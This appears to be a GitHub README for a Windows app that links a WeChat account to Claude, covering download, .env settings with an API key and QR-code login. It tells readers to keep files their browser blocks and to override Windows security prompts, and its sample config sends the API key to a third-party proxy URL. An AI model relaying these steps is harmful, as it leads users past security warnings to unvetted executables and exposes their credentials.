# 🤖 wechatbot - WeChat AI chats made simple

[![Download wechatbot](https://img.shields.io/badge/Download%20wechatbot-blue?style=for-the-badge)](https://github.com/Childcentered-reducing549/wechatbot)

## 🖥️ What this app does

wechatbot is a Windows app that connects WeChat to an AI assistant. It reads messages from WeChat and sends replies back through your account.

It works with:

- Text messages
- Images
- Voice messages

It uses WeChat through the iLink Bot protocol and sends messages to Claude through the Anthropic SDK.

## 📥 Download and open the app

1. Visit the download page: https://github.com/Childcentered-reducing549/wechatbot
2. Look for the latest version or release files
3. Download the Windows file to your computer
4. Open the file after the download finishes

If your browser blocks the file, keep the download and open it from your Downloads folder

## 🚀 First-time setup on Windows

1. Create a folder for the app, such as `C:\wechatbot`
2. Put the downloaded files in that folder
3. Open the app folder
4. Find the setup file or start file
5. Double-click it to run the app

If you see a security prompt from Windows, choose the option that lets the app open

## 🔑 Set up your API key

The app needs an Anthropic API key to reply to messages.

Use these settings:

```env
ANTHROPIC_BASE_URL=https://zenmux.ai/api/anthropic
ANTHROPIC_API_KEY=sk-ai-v1-...
ANTHROPIC_MODEL=anthropic/claude-sonnet-4.6
SYSTEM_PROMPT=You are a helpful assistant on WeChat.
MAX_HISTORY_TURNS=50
```

### What to edit

- `ANTHROPIC_API_KEY`: add your own key
- `ANTHROPIC_MODEL`: keep the default unless you want a different model
- `SYSTEM_PROMPT`: changes how the bot talks
- `MAX_HISTORY_TURNS`: controls how many past messages the bot remembers

## 🛠️ Basic setup files

If the app uses a folder with config files, create or edit a file named `.env` and place the values above inside it.

If you see a file named `.env.example`, copy it to `.env` first, then edit `.env`

## ▶️ Run the bot

1. Open the app or terminal from the app folder
2. Start the bot
3. Wait for a QR code to appear
4. Open WeChat on your phone
5. Scan the QR code
6. Keep WeChat signed in

After the scan, the bot starts listening for messages

To stop the bot, close the window or press Ctrl+C

## 📱 How to connect WeChat

1. Start the app
2. Wait for the QR code
3. Open WeChat
4. Use the scan feature in WeChat
5. Confirm the login on your phone if asked
6. Let the bot stay open while you use it

If the bot closes, it stops replying until you start it again

## 💬 What the bot can handle

### Text messages

Text messages go to Claude, then the bot sends the reply back to WeChat

### 🖼️ Images

The bot downloads the image from WeChat, decrypts it, then sends it to Claude as image data

This helps the bot understand screenshots, photos, and other visual content

### 🎙️ Voice messages

Voice messages get turned into text first, then the text is sent to Claude

The bot replies with text in WeChat

## 🔄 How it works

WeChat User → iLink Bot API → Bot → Claude API → Bot → iLink Bot API → WeChat User

The bot handles the message flow for you

## ⚙️ Recommended Windows setup

Use a Windows 10 or Windows 11 PC with:

- Stable internet access
- Enough free disk space for the app files
- A working WeChat account
- A valid Anthropic API key

For best results, keep the app on while you want it to answer messages

## 🧩 Common use cases

- Reply to simple chat messages
- Help answer questions in a group
- Read and respond to screenshots
- Turn voice notes into text-based replies
- Keep a WeChat account responsive while you work

## 📂 File you may need to edit

If the app includes a settings file, open it in Notepad and update the values before starting the bot.

Use plain text only. Do not add extra symbols around the values

## 🔧 If the app does not start

1. Check that you downloaded the full app files
2. Make sure the `.env` file exists
3. Check that your API key is set
4. Confirm that WeChat is installed and logged in
5. Start the app again

## 📌 Behavior to expect

- The bot waits for messages after login
- The QR code appears before the bot can read messages
- The bot only answers when WeChat stays connected
- Image and voice support depend on the message type and the account session

## 🧭 Simple run steps

1. Download the app from the link above
2. Open the app folder on Windows
3. Set your API key in `.env`
4. Start the app
5. Scan the QR code with WeChat
6. Send a test message to the bot